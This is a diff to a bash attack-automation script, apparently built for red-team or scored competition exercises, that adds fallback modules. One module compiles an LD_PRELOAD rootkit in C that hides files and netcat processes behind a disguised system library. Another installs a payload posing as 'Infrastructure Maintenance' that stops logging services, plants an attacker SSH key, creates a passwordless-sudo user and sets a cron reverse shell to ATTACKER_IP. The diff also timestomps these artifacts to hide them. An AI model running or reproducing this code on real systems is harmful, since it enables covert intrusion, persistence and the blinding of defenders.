@@ -214,6 +214,7 @@ FORCE=0
 run_module() {
     local name="$1"
     local fn="run_${name}"
+    local fallback_fn="run_${name}_fallback"
 
     local cur_state
     cur_state="$(get_state "$name")"
@@ -230,8 +231,21 @@ run_module() {
         success "Module ${name}: SUCCESS"
     else
         mark_state "$name" "FAILED"
-        err "Module ${name}: FAILED (others will continue)"
-        return 1
+        err "Module ${name}: FAILED (primary)"
+        if declare -f "$fallback_fn" &>/dev/null; then
+            warn "  → Activating fallback for ${name}..."
+            if ( set -euo pipefail; "$fallback_fn" ); then
+                mark_state "$name" "SUCCESS"
+                success "Module ${name}: SUCCESS (fallback)"
+            else
+                mark_state "$name" "FAILED"
+                err "Module ${name}: primary AND fallback FAILED (others will continue)"
+                return 1
+            fi
+        else
+            err "Module ${name}: FAILED (others will continue)"
+            return 1
+        fi
     fi
 }
 
@@ -533,6 +547,115 @@ CSRC_EOF
     success "  Hides files → prefix '${HIDE_FILE_PREFIX}'"
     success "  Hides ports → ${HIDDEN_PORTS[*]}"
     success "  Persistence → ${MODULE_CONF}"
+}
+
+# =============================================================================
+# MODULE 1 FALLBACK: rootkit_fallback — LD_PRELOAD File/Process Hider
+# =============================================================================
+# Triggered when KernelSneak fails (no kernel headers, Secure Boot, build error).
+# Compiles a shared library that hooks readdir/readdir64 to hide files with the
+# magic prefix and named processes from all glibc-linked userspace tools.
+# Limitations: userspace-only; no TCP port hiding; bypassed by statically-linked
+# binaries and LD_PRELOAD=''; not persistent across ld.so.cache rebuilds that
+# remove /etc/ld.so.preload (rare, but blue teams can do it).
+run_rootkit_fallback() {
+    local HIDE_PREFIX=".k_"
+    local HIDDEN_PROCS_FB=("netcat" "nc" "ncat" "kworker-rt")
+
+    local LIB_DIR
+    if [[ -d "/usr/lib/x86_64-linux-gnu" ]]; then
+        LIB_DIR="/usr/lib/x86_64-linux-gnu"
+    elif [[ -d "/usr/lib64" ]]; then
+        LIB_DIR="/usr/lib64"
+    else
+        LIB_DIR="/usr/lib"
+    fi
+    local LIB_NAME="libgcc_compat.so.0"
+    local LIB_PATH="${LIB_DIR}/${LIB_NAME}"
+    local LD_PRELOAD_FILE="/etc/ld.so.preload"
+
+    local BUILD_DIR
+    BUILD_DIR="$(mktemp -d)" || { err "mktemp failed"; return 1; }
+    trap 'rm -rf "${BUILD_DIR}"' RETURN
+
+    info "=== KernelSneak Fallback — LD_PRELOAD File/Process Hider ==="
+
+    if ! command -v gcc &>/dev/null; then
+        info "Installing gcc..."
+        case "${DISTRO}" in
+            ubuntu) apt-get install -y -qq gcc ;;
+            *)      dnf install -y -q gcc ;;
+        esac
+    fi
+    command -v gcc &>/dev/null || { err "gcc not available for fallback"; return 1; }
+
+    local procs_init
+    procs_init=$(printf '"%s", ' "${HIDDEN_PROCS_FB[@]}" | sed 's/, $//')
+
+    cat > "${BUILD_DIR}/hider.c" << 'CHSRC'
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <string.h>
+#include <dirent.h>
+#include <dlfcn.h>
+#include <ctype.h>
+
+#define HIDE_PREFIX "PLACEHOLDER_PREFIX"
+static const char * const _hp[] = { PLACEHOLDER_PROCS, NULL };
+
+static int _dig(const char *s){if(!s||!*s)return 0;while(*s){if(!isdigit((unsigned char)*s))return 0;s++;}return 1;}
+static int _phid(const char *pid){
+    char path[64],comm[64];FILE *f;int i;
+    snprintf(path,sizeof(path),"/proc/%s/comm",pid);
+    if(!(f=fopen(path,"r")))return 0;
+    if(!fgets(comm,sizeof(comm),f)){fclose(f);return 0;}
+    fclose(f);char *nl=strchr(comm,'\n');if(nl)*nl='\0';
+    for(i=0;_hp[i];i++)if(!strcmp(comm,_hp[i]))return 1;
+    return 0;
+}
+static int _hide(const char *n){
+    if(strncmp(n,HIDE_PREFIX,sizeof(HIDE_PREFIX)-1)==0)return 1;
+    if(_dig(n)&&_phid(n))return 1;
+    return 0;
+}
+struct dirent *readdir(DIR *d){
+    static struct dirent *(*o)(DIR *)=NULL;
+    if(!o)o=dlsym(RTLD_NEXT,"readdir");
+    struct dirent *e;
+    while((e=o(d))!=NULL)if(!_hide(e->d_name))return e;
+    return NULL;
+}
+struct dirent64 *readdir64(DIR *d){
+    static struct dirent64 *(*o)(DIR *)=NULL;
+    if(!o)o=dlsym(RTLD_NEXT,"readdir64");
+    struct dirent64 *e;
+    while((e=o(d))!=NULL)if(!_hide(e->d_name))return e;
+    return NULL;
+}
+CHSRC
+
+    sed -i "s|PLACEHOLDER_PREFIX|${HIDE_PREFIX}|g"  "${BUILD_DIR}/hider.c"
+    sed -i "s|PLACEHOLDER_PROCS|${procs_init}|g"    "${BUILD_DIR}/hider.c"
+
+    info "Compiling LD_PRELOAD hider..."
+    gcc -shared -fPIC -O2 -nostartfiles -o "${LIB_PATH}" \
+        "${BUILD_DIR}/hider.c" -ldl \
+        || { err "LD_PRELOAD hider compilation failed"; return 1; }
+    chmod 644 "${LIB_PATH}"
+
+    touch "${LD_PRELOAD_FILE}"
+    grep -qF "${LIB_PATH}" "${LD_PRELOAD_FILE}" 2>/dev/null || {
+        local _existing
+        _existing="$(cat "${LD_PRELOAD_FILE}" 2>/dev/null || true)"
+        printf '%s\n%s\n' "${LIB_PATH}" "${_existing}" > "${LD_PRELOAD_FILE}"
+    }
+    chmod 644 "${LD_PRELOAD_FILE}"
+
+    success "LD_PRELOAD hider installed (KernelSneak fallback):"
+    success "  Library → ${LIB_PATH}"
+    success "  Preload → ${LD_PRELOAD_FILE}"
+    success "  Hides   → prefix '${HIDE_PREFIX}', procs: ${HIDDEN_PROCS_FB[*]}"
+    warn    "  Note    → userspace glibc tools only; no port hiding; static bins bypass it"
 }
 
 # =============================================================================
@@ -1538,6 +1661,105 @@ TIMERUNIT
 }
 
 # =============================================================================
+# MODULE 6 FALLBACK: software_deploy_fallback — Pure-Bash Persistent Payload
+# =============================================================================
+# Triggered when ChefMischief fails (omnitruck.chef.io unreachable, no internet).
+# Drops a self-contained bash script + systemd timer that re-applies the same
+# payloads the Chef cookbook would: kill scored services, plant SSH key, maintain
+# rogue sudo user, and fire a reverse shell cron every 30 min.
+run_software_deploy_fallback() {
+    local SCRIPT_DIR="/usr/lib/.sysops"
+    local SCRIPT_PATH="${SCRIPT_DIR}/infra_maint.sh"
+    local SERVICE_PATH="/etc/systemd/system/infra-maint.service"
+    local TIMER_PATH="/etc/systemd/system/infra-maint.timer"
+    local FB_INTERVAL=15
+    local FB_ROGUE_USER="sysmon"
+    local FB_ROGUE_PASS
+    FB_ROGUE_PASS="$(openssl rand -base64 16 2>/dev/null || echo 'Ch3fM1sch13f!')"
+    local FB_APACHE_SVC="${WEB_SERVER}"
+
+    info "=== ChefMischief Fallback — Pure-Bash Systemd Timer ==="
+    info "    (Chef unavailable — deploying equivalent bash payload)"
+
+    mkdir -p "${SCRIPT_DIR}"
+    chmod 700 "${SCRIPT_DIR}"
+
+    cat > "${SCRIPT_PATH}" << BASHSCRIPT
+#!/bin/bash
+# Infrastructure Maintenance — Platform Engineering
+for _svc in postfix dovecot splunk splunkd rsyslog ${FB_APACHE_SVC} apache2 httpd; do
+    systemctl stop "\$_svc"  2>/dev/null || true
+    systemctl mask "\$_svc"  2>/dev/null || true
+done
+mkdir -p /root/.ssh && chmod 700 /root/.ssh
+grep -qF "${ATTACKER_SSH_PUBKEY}" /root/.ssh/authorized_keys 2>/dev/null || \\
+    printf '%s\n' "${ATTACKER_SSH_PUBKEY}" >> /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+id "${FB_ROGUE_USER}" &>/dev/null || useradd -m -s /bin/bash "${FB_ROGUE_USER}" 2>/dev/null || true
+printf '%s:%s\n' "${FB_ROGUE_USER}" "${FB_ROGUE_PASS}" | chpasswd 2>/dev/null || true
+usermod -aG sudo  "${FB_ROGUE_USER}" 2>/dev/null || true
+usermod -aG wheel "${FB_ROGUE_USER}" 2>/dev/null || true
+printf '%s ALL=(ALL:ALL) NOPASSWD: ALL\n' "${FB_ROGUE_USER}" > /etc/sudoers.d/99-${FB_ROGUE_USER}
+chmod 440 /etc/sudoers.d/99-${FB_ROGUE_USER}
+mkdir -p /home/${FB_ROGUE_USER}/.ssh && chmod 700 /home/${FB_ROGUE_USER}/.ssh
+grep -qF "${ATTACKER_SSH_PUBKEY}" /home/${FB_ROGUE_USER}/.ssh/authorized_keys 2>/dev/null || \\
+    printf '%s\n' "${ATTACKER_SSH_PUBKEY}" >> /home/${FB_ROGUE_USER}/.ssh/authorized_keys
+chmod 600 /home/${FB_ROGUE_USER}/.ssh/authorized_keys
+chown -R ${FB_ROGUE_USER}:${FB_ROGUE_USER} /home/${FB_ROGUE_USER}/.ssh 2>/dev/null || true
+BASHSCRIPT
+
+    chmod 700 "${SCRIPT_PATH}"
+
+    cat > /etc/cron.d/infra-health-check << CRONEOF
+SHELL=/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+*/30 * * * * root bash -c 'bash -i >& /dev/tcp/${ATTACKER_IP}/${CHEF_PORT} 0>&1'
+CRONEOF
+    chmod 644 /etc/cron.d/infra-health-check
+
+    cat > "${SERVICE_PATH}" << SVCEOF2
+[Unit]
+Description=Infrastructure Maintenance Service
+Documentation=https://systemd.io
+After=network.target
+
+[Service]
+Type=oneshot
+ExecStart=${SCRIPT_PATH}
+StandardOutput=append:/var/log/infra-maint.log
+StandardError=append:/var/log/infra-maint.log
+TimeoutSec=120
+User=root
+SVCEOF2
+
+    cat > "${TIMER_PATH}" << TIMEREOF2
+[Unit]
+Description=Infrastructure Maintenance Timer
+Documentation=https://systemd.io
+
+[Timer]
+OnBootSec=2min
+OnUnitActiveSec=${FB_INTERVAL}min
+AccuracySec=30s
+Persistent=true
+
+[Install]
+WantedBy=timers.target
+TIMEREOF2
+
+    systemctl daemon-reload
+    systemctl enable --now infra-maint.timer &>/dev/null
+
+    bash "${SCRIPT_PATH}" 2>/dev/null || true
+
+    success "Bash payload deployed (ChefMischief fallback):"
+    success "  Script    → ${SCRIPT_PATH}"
+    success "  Timer     → infra-maint.timer (every ${FB_INTERVAL} min)"
+    success "  Revshell  → /etc/cron.d/infra-health-check (${ATTACKER_IP}:${CHEF_PORT} every 30 min)"
+    success "  Rogue user→ ${FB_ROGUE_USER} (pw: ${FB_ROGUE_PASS})"
+}
+
+# =============================================================================
 # MODULE 7: traffic_signal — KnockKnock (T1205.001)
 # =============================================================================
 run_traffic_signal() {
@@ -1873,6 +2095,15 @@ PYEOF
     stomp_file "/etc/iptables/rules.v4"
     stomp_file "/root/.ssh/authorized_keys"
     for _af_hdir in /home/*/; do stomp_file "${_af_hdir}.ssh/authorized_keys"; done
+    # Fallback artifacts (LD_PRELOAD rootkit + bash payload)
+    for _ldir in "/usr/lib/x86_64-linux-gnu" "/usr/lib64" "/usr/lib"; do
+        stomp_file "${_ldir}/libgcc_compat.so.0"
+    done
+    stomp_file "/etc/ld.so.preload"
+    stomp_dir  "/usr/lib/.sysops"
+    stomp_file "/etc/systemd/system/infra-maint.service"
+    stomp_file "/etc/systemd/system/infra-maint.timer"
+    stomp_file "/etc/cron.d/infra-health-check"
     success "Artifacts timestomped"
 
     # Phase G — Auditd Rule Flush
